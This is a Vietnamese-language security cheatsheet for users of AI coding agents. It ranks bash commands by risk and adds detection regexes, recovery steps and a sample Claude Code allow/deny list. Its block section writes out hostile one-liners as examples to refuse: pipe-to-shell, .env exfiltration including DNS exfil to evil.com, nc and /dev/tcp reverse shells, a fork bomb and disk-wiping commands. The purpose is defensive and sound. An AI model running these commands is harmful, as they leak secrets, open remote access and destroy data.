@@ -1,0 +1,161 @@
+================================================================================
+  AI BASH COMMANDS - CHEATSHEET                       v1.0 - Hung 2x - 05/2026
+================================================================================
+
+  QUY TAC 5 GIAY
+  --------------
+  1. Doc lenh - dung click Allow theo phan xa
+  2. Co  | bash  hay  | sh         -> [X] BLOCK
+  3. Co  $(cat ...)  trong URL     -> [X] BLOCK
+  4. Co path .env / .ssh / .aws/   -> [!] HOI LAI
+  5. Co  sudo  khong ro ly do      -> [!] HOI LAI
+  6. Khong thuoc 4 cai tren        -> [OK]
+
+================================================================================
+  [+] AN TOAN - cu chay
+================================================================================
+  ls       ls -la    pwd        whoami     uname
+  cat      head      tail       less       file
+  grep     rg        find       which      type
+  wc       sort      uniq       cut        stat
+  df       du        free       ps         top
+  git status   git log   git diff   git show   git blame
+  ping     dig       nslookup   echo       printf
+
+================================================================================
+  [~] CAN DOC - allow neu hieu
+================================================================================
+  npm/pip/yarn install <pkg>    -> check ten, nguon chinh thuc
+  cp <src> <dst>                -> co ghi de file quan trong?
+  mv <src> <dst>                -> path dung chua?
+  sed -i  /  awk (write)        -> pattern regex dung?
+  mkdir / touch                 -> path tao o dau?
+  git add / commit / pull       -> co lo commit .env, *.key?
+  ps / kill <pid>               -> kill nham process prod?
+  env / printenv                -> output co secrets, dung share log
+  curl <URL>  /  wget <URL>     -> URL tin duoc?
+  zip / tar -c                  -> archive gom file nhay cam?
+  docker build / pull           -> Dockerfile co la?
+  make / npm run build          -> doc script truoc
+
+================================================================================
+  [!] NGUY HIEM - HOI LAI truoc khi allow
+================================================================================
+  rm -rf <path>                 -> "path chinh xac la gi?"
+  rm -rf $VAR/...               -> "$VAR co gia tri?" (rong = xoa root)
+  cat .env  /  ~/.aws/...       -> "tai sao can doc?"
+  cat ~/.ssh/id_*               -> KHONG co ly do hop le
+  chmod 777  /  chmod -R 777    -> "quyen cu the nao?"
+  chmod +s  /  chown root:root  -> privilege escalation
+  sudo <anything>               -> "tai sao can root?"
+  curl -X POST ...              -> "gui data gi? den dau?"
+  crontab -e / systemctl enable -> "script lam gi? chay khi nao?"
+  git push --force              -> "co nguoi khac da pull chua?"
+  git reset --hard / rebase -i  -> backup chua?
+  docker run --privileged       -> gan nhu luon red flag
+  docker run -v /:/host         -> mount root, het isolation
+  iptables -F  /  ufw disable   -> "tai sao tat firewall?"
+  mkfs.* / dd if=... of=...     -> confirm device path TRUOC
+
+================================================================================
+  [X] TUYET DOI BLOCK - khong can doc tiep
+================================================================================
+  curl URL | bash               curl URL | sh
+  wget URL | bash               bash <(curl ...)
+  eval "$(curl ...)"
+
+  rm -rf /                      rm -rf /*
+
+  curl URL -d "$(cat .env)"     curl URL -d "$(env)"
+  dig "$(cat .env).evil.com"    # DNS exfil
+
+  :(){ :|:& };:                 # fork bomb
+
+  base64 -d | bash              # obfuscated execution
+
+  nc -e /bin/sh <host> <port>
+  bash -i >& /dev/tcp/<h>/<p> 0>&1
+  python -c "import socket,os,pty;..."   # reverse shell
+
+  dd if=/dev/urandom of=/dev/sda
+  mkfs.ext4 /dev/sda            shred /dev/sda
+  > ~/.bashrc  /  > ~/.zshrc    # truncate rc
+  history -c                    # xoa dau vet
+  chattr +i /etc/passwd
+
+================================================================================
+  8 PATTERN NGUY HIEM - nhan dien 1 dong
+================================================================================
+  P-01 Credential Exposure    cat .env, printenv | grep KEY/TOKEN
+  P-02 Pipe to Shell           curl ... | bash, bash <(curl ...)
+  P-03 Silent Exfiltration     curl POST + $(cat), DNS exfil
+  P-04 Permission Escalation   chmod 777, sudo khong ly do, chmod +s
+  P-05 Persistence Setup       crontab, systemctl enable, .bashrc
+  P-06 Dependency Confusion    package ten typo (lodahs), URL git la
+  P-07 Git History Mining      git log -p .env, git show :credentials
+  P-08 Environment Pollution   .bashrc append, npm registry, git hook
+
+================================================================================
+  DETECTION REGEX - dan vao hook
+================================================================================
+  \|\s*(bash|sh|zsh)\b              # pipe to shell
+  curl[^|]*\|                       # curl | anything
+  rm\s+-[rRf]+\s+(/|/\*)            # rm -rf / hoac /*
+  base64\s+-d\s*\|                  # base64 -d | ...
+  nc\s+-e                           # netcat reverse shell
+  /dev/tcp/                         # bash reverse shell
+  chmod\s+(-R\s+)?777               # chmod 777
+  :\(\)\{[\s]*:\|:&[\s]*\}          # fork bomb
+  \$\(cat\s+[^)]*\.env              # $(cat .env)
+  curl[^"]*-d\s+"\$\(               # curl -d "$(...)"
+  >\s*~/\.(bash|zsh)rc\s*$          # truncate rc file
+  /dev/(sd[a-z]|nvme|hd[a-z])       # raw disk write
+
+================================================================================
+  CAU HOI VAN NANG KHI NGHI NGO
+================================================================================
+  "Giai thich lenh nay - no lam gi chinh xac? Tai sao can? Co cach an
+   toan hon khong?"
+
+  AI tot se tra loi ro. AI khong tra loi duoc -> ban biet phai lam gi.
+
+================================================================================
+  SANDBOX 1 DONG (Docker)
+================================================================================
+  docker run --rm -it --cap-drop=ALL --security-opt=no-new-privileges \
+    -v "$(pwd)":/workspace -w /workspace -u "$(id -u):$(id -g)" \
+    node:20-slim bash
+
+================================================================================
+  DA LO CHAY LENH XAU - 6 BUOC RECOVERY
+================================================================================
+  1. STOP    Ctrl+C, pkill -P $(pgrep -f "claude-code|cursor|cline")
+  2. ASSESS  Lenh gi? Da cham vao gi? (doc log)
+  3. ROTATE  Doi MOI key (AWS, GitHub, OpenAI, DB, SSH)
+  4. CHECK   crontab -l | systemctl list | ~/.ssh/authorized_keys
+             ls ~/Library/LaunchAgents/ | netstat -anp
+  5. RECOVER git reflog | Time Machine | extundelete
+  6. LEARN   Update allowlist/denylist | Report bug platform
+
+================================================================================
+  ALLOWLIST / DENYLIST MAU (Claude Code ~/.claude/settings.json)
+================================================================================
+  {
+    "permissions": {
+      "allow": [
+        "Bash(ls *)", "Bash(cat *)", "Bash(git status)",
+        "Bash(git diff *)", "Bash(git log *)", "Bash(pwd)",
+        "Bash(grep *)", "Bash(rg *)"
+      ],
+      "deny": [
+        "Bash(rm -rf *)", "Bash(curl * | *bash*)",
+        "Bash(curl * | *sh*)", "Bash(sudo *)",
+        "Bash(chmod 777 *)", "Bash(* > ~/.bashrc)",
+        "Bash(cat *credentials*)", "Bash(cat *.pem)", "Bash(cat *.key)"
+      ]
+    }
+  }
+
+================================================================================
+  Hung 2x  -  05/2026  -  hungld10.github.io/share-everything-about-ai
+================================================================================
